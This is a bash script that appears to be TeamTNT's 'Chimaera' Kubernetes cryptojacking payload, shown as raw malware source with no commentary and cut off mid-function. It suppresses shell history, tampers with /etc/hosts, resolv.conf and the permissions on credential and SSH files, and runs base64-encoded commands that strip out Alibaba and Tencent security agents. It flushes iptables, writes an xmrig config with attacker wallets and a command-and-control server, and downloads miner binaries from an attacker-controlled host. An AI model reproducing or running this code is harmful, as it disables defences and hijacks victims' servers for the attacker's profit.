#!/bin/bash
#
#	TITLE:		Chimaera_Kubernetes_root_PayLoad_2
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	Chimaera_stable_V1.00.1
#	DATE:		12.08.2021
#
#	SRC:        http://chimaera.cc/cmd/Kubernetes_root_PayLoad_2.sh
#
########################################################################

ulimit -n 65535

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

if [ "$(uname -m)" = "aarch64" ]; then C_hg_SYS="aarch64"
elif [ "$(uname -m)" = "x86_64" ];  then C_hg_SYS="x86_64"
elif [ "$(uname -m)" = "i386" ];    then C_hg_SYS="i386"
else C_hg_SYS="i386"; fi

WALLET="84hYzyMkfn8RAb5yMq7v7QfcZ3zgBhsGxYjMKcZU8E43ZDDwDAdKY5t84TMZqfPVW84Dq58AhP3AbUNoxznhvxEaV23f57T"
ID_RSA_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYmuFzpuEpN/KHPbQkSUT1Xe/gVl3FpIe/GlhJEnW84rCMsYhRe2xxcPc1xfZd10JBhM1kEhs5aycIYiPvLYTRi7mA88hE15OVCkwgPT2HgaY8oetbiNiu18jBygbnku2/avpf/Xl2vkcNJRwHjkik3/Vid9fSleNWeAI+RGrMRRiP4hXVBQjHbuSFlw2VDg0uZINodP+n8oWBDHGnMGei9W6OXxQ3R5C+oKBw9NA3K/drsqvJh81jbEkDXyqCG0Nj0sAUk6o/aGIIQpwxI3ez2Vi/lqm5LYsRO6ICsHP6RXJT/08XkUVNMu7BLnje2RCG/kSKjVqW8QePyajHJ64kHwYf1yeyGfObZJWhUSP3yPK6UtGxBouyA/TPTqvba4vAmUy1Jl7hyWkoa4KUwgmsEizmT9n8GEg1USPXxRWNqv0VIi5160tcoujrB85HYwjwIhbphCqhTKyNwnnFJNratI1hGurgr8t0fflC/igLph8PapiayTwTLEbNwSUwVp8D3rvBkYB+XV2wO4+q24IoNZJO6ePXEA80jAVEa7eGhlnV5BUIIG+pYP/CkukcggyW+vGRTrl07KrvhAn9dLGDg1J8KZM2hMx5L/2ulgjKTjPZI566fL6Y0dDhPJZH8bxAq6i/ciXXZFeuaG4eCDkitPdSzhFtyuZQj712h6NLow== root@localhost'
SO_FILE="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/kuben3/$C_hg_SYS.so"

#XMR_1_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/kuben3/xmrig.tar.gz123"
XMR_1_BIN_FSZ="3065726"
XMR_2_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/kuben3/$C_hg_SYS.tar.gz"
XMR_1_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/kuben3/$C_hg_SYS.tar.gz"

export HOME=/usr/sbin
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin
if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi

unset CHECK_RUNNING
CHECK_RUNNING=$(pidof /usr/sbin/.configure/xmrig)
if [ ! -z "$CHECK_RUNNING" ]; then exit; fi


########################################################################

function C_hg_DLOAD() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

function C_hg_UNLOCK(){
C_hg_FILE_TO_UNLOCK=$1
if [ "$(command -v chattr)" = "0" ]; then chattr -ia $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [ "$(command -v tntrecht)" = "0" ]; then tntrecht -ia $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [ "$(command -v ichdarf)" = "0" ]; then ichdarf -ia $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [ "$(command -v C_hg_chattr)" = "0" ]; then C_hg_chattr -ia $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
}

function C_hg_LOCK(){
C_hg_FILE_TO_UNLOCK=$1
if [ "$(command -v chattr)" = "0" ]; then chattr +a $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [ "$(command -v tntrecht)" = "0" ]; then tntrecht +a $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [ "$(command -v ichdarf)" = "0" ]; then ichdarf +a $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
if [ "$(command -v C_hg_chattr)" = "0" ]; then C_hg_chattr +a $C_hg_FILE_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
}

function C_hg_SYSTEM_FIX(){
C_hg_DIR_ARRAY=("/" "/tmp" "/var" "/var/tmp" "/var/spool" "/var/spool/cron" "/var/spool/cron/crontabs" "/bin" "/sbin" "/usr" "/usr/bin" "/usr/sbin" "/dev" "/dev/shm" "/etc" "/etc/ssh" "/root" "/root/.ssh")
C_hg_FILE_ARRAY=("/var/spool/cron/crontabs/root" "/var/spool/cron/root" "/etc/crontab" "/etc/resolv.conf" "/etc/hosts" "/etc/motd" "/etc/passwd" "/etc/shadow" "/etc/sudoers" "/etc/group" "/etc/ssh/ssh_config" "/etc/ssh/sshd_config" "/root/.ssh/authorized_keys" "/root/.ssh/authorized_keys2")
for C_hg_DIR in ${C_hg_DIR_ARRAY[@]}; do C_hg_UNLOCK $C_hg_DIR 2>/dev/null 1>/dev/null; done
for C_hg_FILE in ${C_hg_FILE_ARRAY[@]}; do C_hg_UNLOCK $C_hg_FILE 2>/dev/null 1>/dev/null; done
}

function C_hg_PACK_SETUP(){
BINARY=$1
APKPACK=$2
APTPACK=$3
YUMPACK=$4
if ! type $BINARY 2>/dev/null 1>/dev/null; then 
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add $APKPACK 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y $YUMPACK 2>/dev/null 1>/dev/null; fi ; fi
	if ! type $BINARY 2>/dev/null 1>/dev/null; then 
	if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk info | xargs apk fix 2>/dev/null 1>/dev/null ; fi
	if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null ; fi
	if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null ; fi ; 	fi
}

function C_hg_IF_EXIST_REMOVE(){
C_hg_TEXT=$1
C_hg_FILE=$2
if [[ "$(grep $C_hg_TEXT $C_hg_FILE)" ]]; then
C_hg_UNLOCK $C_hg_FILE
sed -i '/'$C_hg_TEXT'/d' $C_hg_FILE 2>/dev/null
C_hg_LOCK $C_hg_FILE
fi

}

function C_hg_DNS_MOD(){

if [[ ! "$(grep '45.9.148.108 chimaera.cc' /etc/hosts)" ]]; then
C_hg_IF_EXIST_REMOVE chimaera /etc/hosts
C_hg_UNLOCK /etc/hosts
echo "45.9.148.108 chimaera.cc" >> /etc/hosts 2>/dev/null
C_hg_LOCK /etc/hosts
fi

if [[ ! "$(grep '45.9.148.108 teamtnt.red' /etc/hosts)" ]]; then
C_hg_IF_EXIST_REMOVE teamtnt /etc/hosts
C_hg_UNLOCK /etc/hosts
echo "45.9.148.108 teamtnt.red" >> /etc/hosts 2>/dev/null
C_hg_LOCK /etc/hosts
fi

if [[ ! "$(grep 'nameserver 8.8.8.8\|nameserver 8.8.4.4' /etc/resolv.conf)" ]]; then 
C_hg_IF_EXIST_REMOVE nameserver /etc/resolv.conf
fi

if [[ ! "$(grep 'nameserver 8.8.8.8' /etc/resolv.conf)" ]]; then 
C_hg_UNLOCK /etc/resolv.conf
echo "nameserver 8.8.8.8" >> /etc/resolv.conf 2>/dev/null
C_hg_LOCK /etc/resolv.conf
fi

if [[ ! "$(grep 'nameserver 8.8.4.4' /etc/resolv.conf)" ]]; then 
C_hg_UNLOCK /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf 2>/dev/null
C_hg_LOCK /etc/resolv.conf
fi

}

function C_hg_SYSTEM_MOD(){
C_hg_UNLOCK $(command -v tntrecht)
C_hg_UNLOCK $(command -v chattr)
C_hg_UNLOCK $(command -v ichdarf)
C_hg_UNLOCK $(command -v C_hg_chattr)

if [[ "$(command -v tntrecht)" ]]; then
rm -f $(command -v chattr) 2>/dev/null 1>/dev/null
mv $(command -v tntrecht) /usr/bin/chattr 2>/dev/null 1>/dev/null
chmod +x /usr/bin/chattr 2>/dev/null 1>/dev/null
fi

if [ ! -f "/usr/sbin/C_hg_curl" ]; then
if [ ! -f "$(command -v curl)" ]; then C_hg_PACK_SETUP curl curl curl curl ; fi
cp $(command -v curl) /usr/sbin/C_hg_curl
chmod +x /usr/sbin/C_hg_curl
C_hg_LOCK /usr/sbin/C_hg_curl
fi
}

function C_hg_VOR_INIT(){
C_hg_SYSTEM_FIX
C_hg_DNS_MOD
C_hg_PACK_SETUP curl curl curl curl
C_hg_PACK_SETUP wget wget wget wget
C_hg_PACK_SETUP bash bash bash bash
C_hg_PACK_SETUP sudo sudo sudo sudo
C_hg_PACK_SETUP nproc coreutils coreutils coreutils
C_hg_PACK_SETUP bc bc bc bc
C_hg_PACK_SETUP lspci pciutils pciutils pciutils
C_hg_SYSTEM_MOD
}

C_hg_VOR_INIT

########################################################################




if ps aux | grep -i '[a]liyun' 2>/dev/null 1>/dev/null; then
echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7Cmtwcm9iZUFycj0oCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9pbnN0YW5jZXMvYWVnaXNfZG9fc3lzX29wZW4vc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzX2luZXRfY3NrX2FjY2VwdC9zZXRfZXZlbnQiCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9pbnN0YW5jZXMvYWVnaXNfdGNwX2Nvbm5lY3Qvc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzL3NldF9ldmVudCIKICAgICIvc3lzL2tlcm5lbC9kZWJ1Zy90cmFjaW5nL2luc3RhbmNlcy9hZWdpc18vc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzX2FjY2VwdC9zZXRfZXZlbnQiCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9rcHJvYmVfZXZlbnRzIgogICAgIi91c3IvbG9jYWwvYWVnaXMvYWVnaXNfZGVidWcvdHJhY2luZy9zZXRfZXZlbnQiCiAgICAiL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19kZWJ1Zy90cmFjaW5nL2twcm9iZV9ldmVudHMiCikKZm9yIHZhbHVlIGluICR7a3Byb2JlQXJyW0BdfQpkbwogICAgaWYgWyAtZiAiJHZhbHVlIiBdOyB0aGVuCiAgICAgICAgZWNobyA+ICR2YWx1ZQogICAgZmkKZG9uZQppZiBbIC1kICIke0FFR0lTX0lOU1RBTExfRElSfSIgXTt0aGVuCiAgICB1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKICAgIGlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9L2Nncm91cC9jcHUiIF07dGhlbgogICAgICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9jZ3JvdXAvY3B1CiAgICBmaQogICAgaWYgWyAtZCAiJHtBRUdJU19JTlNUQUxMX0RJUn0vY2dyb3VwIiBdO3RoZW4KICAgICAgICB1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vY2dyb3VwCiAgICBmaQogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash
echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash
pkill aliyun-service 2>/dev/null 1>/dev/null
rm -rf /etc/init.d/agentwatch 2>/dev/null 1>/dev/null
rm -fr /usr/sbin/aliyun-service 2>/dev/null 1>/dev/null
rm -rf /usr/local/aegis* 2>/dev/null 1>/dev/null
systemctl stop aliyun.service 2>/dev/null 1>/dev/null ; service aliyun stop 2>/dev/null 1>/dev/null
systemctl disable aliyun.service 2>/dev/null 1>/dev/null
systemctl stop bcm-agent 2>/dev/null 1>/dev/null ; service bcm-agent stop 2>/dev/null 1>/dev/null
if type yum 2>/dev/null 1>/dev/null; then yum remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
if type apt-get 2>/dev/null 1>/dev/null; then apt-get remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
elif ps aux | grep -i '[y]unjing' 2>/dev/null 1>/dev/null; then
/usr/local/qcloud/stargate/admin/uninstall.sh 2>/dev/null 1>/dev/null
/usr/local/qcloud/YunJing/uninst.sh 2>/dev/null 1>/dev/null
/usr/local/qcloud/monitor/barad/admin/uninstall.sh 2>/dev/null 1>/dev/null
fi
if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
/usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop 2>/dev/null 1>/dev/null
/usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove 2>/dev/null 1>/dev/null
rm -rf /usr/local/cloudmonitor 2>/dev/null 1>/dev/null	
else export ARCH=amd64
if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then
/usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop 2>/dev/null 1>/dev/null
/usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall 2>/dev/null 1>/dev/null
rm -rf /usr/local/cloudmonitor 2>/dev/null 1>/dev/null	
#else echo "AliCloudMonitor NOT running" ; fi
fi
fi

if type iptables 2>/dev/null 1>/dev/null; then iptables -F 2>/dev/null; fi

if [[ -z $HOME ]]; then export HOME=/root ; fi
if [[ ! -d $HOME ]]; then mkdir -p $HOME ; fi
if [[ ! -d /usr/sbin/.configure/ ]]; then mkdir -p /usr/sbin/.configure/ 2>/dev/null 1>/dev/null; fi


echo "[*] Removing previous miner (if any)"
systemctl stop account_daemons.service 2>/dev/null
systemctl stop moneroocean_miner.service 2>/dev/null
killall -9 xmrig 2>/dev/null
killall -9 xmrigMiner 2>/dev/null

echo "[*] Removing moneroocean/ directorys"
rm -rf /usr/sbin/moneroocean/ 2>/dev/null
rm -rf /usr/bin/moneroocean/ 2>/dev/null
rm -rf $HOME/moneroocean/ 2>/dev/null


function CREATE_JSON_CONFIG(){

rm -f /usr/sbin/.configure/*.json 2>/dev/null

cat > /usr/sbin/.configure/config.json <<EOL
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "force-autoconfig": false,
        "max-threads-hint": 100,
        "max-cpu-usage": null,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": "/usr/sbin/.configure/xmrig.log",
    "pools": [
        {
            "algo": null,
            "coin": "monero",
            "url": "94.130.12.27:443",
            "user": "84hYzyMkfn8RAb5yMq7v7QfcZ3zgBhsGxYjMKcZU8E43ZDDwDAdKY5t84TMZqfPVW84Dq58AhP3AbUNoxznhvxEaV23f57T",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },{
            "algo": null,
            "coin": "monero",
            "url": "94.130.12.27:3333",
            "user": "84hYzyMkfn8RAb5yMq7v7QfcZ3zgBhsGxYjMKcZU8E43ZDDwDAdKY5t84TMZqfPVW84Dq58AhP3AbUNoxznhvxEaV23f57T",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },{
            "algo": null,
            "coin": "monero",
            "url": "pool.supportxmr.com:3333",
            "user": "84hYzyMkfn8RAb5yMq7v7QfcZ3zgBhsGxYjMKcZU8E43ZDDwDAdKY5t84TMZqfPVW84Dq58AhP3AbUNoxznhvxEaV23f57T",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },      
        {
            "algo": null,
            "coin": "monero",
            "url": "3.125.10.23:10128",
            "user": "438ss2gYTKze7kMqrgUagwEjtm993CVHk1uKHUBZGy6yPaZ2WNe5vdDFXGoVvtf7wcbiAUJix3NR9Ph1aq2NqSgyBkVFEtZ",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },{
            "algo": null,
            "coin": "monero",
            "url": "3.125.10.23:443",
            "user": "438ss2gYTKze7kMqrgUagwEjtm993CVHk1uKHUBZGy6yPaZ2WNe5vdDFXGoVvtf7wcbiAUJix3NR9Ph1aq2NqSgyBkVFEtZ+128000",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        },{
            "algo": null,
            "coin": "monero",
            "url": "gulf.moneroocean.stream:10128",
            "user": "438ss2gYTKze7kMqrgUagwEjtm993CVHk1uKHUBZGy6yPaZ2WNe5vdDFXGoVvtf7wcbiAUJix3NR9Ph1aq2NqSgyBkVFEtZ",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }     
    ],
    "cc-client": {
        "enabled": true,
        "url": "45.9.148.182:4321",
        "access-token": "a97be72001bd9970d20dcf1cdddeaf63",
        "use-tls": true,
        "use-remote-logging": true,
        "upload-config-on-start": true,
        "worker-id": null,
        "reboot-cmd": null,
        "update-interval-s": 30
    },
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": null,
    "verbose": 0,
    "watch": true
}
EOL

cp /usr/sbin/.configure/config.json /usr/sbin/.configure/config_background.json
sed -i 's/"background": *false,/"background": true,/' /usr/sbin/.configure/config_background.json

}


function DOWNLOAD_FILE(){

echo "[*] Downloading advanced xmrig to /usr/sbin/.configure/xmrig.tar.gz"
if type wget 2>/dev/null 1>/dev/null; then wget -q $XMR_1_BIN_URL -O /usr/sbin/.configure/xmrig.tar.gz
elif type wd1 2>/dev/null 1>/dev/null; then wd1 -q $XMR_1_BIN_URL -O /usr/sbin/.configure/xmrig.tar.gz
elif type wdl 2>/dev/null 1>/dev/null; then wdl -q $XMR_1_BIN_URL -O /usr/sbin/.configure/xmrig.tar.gz
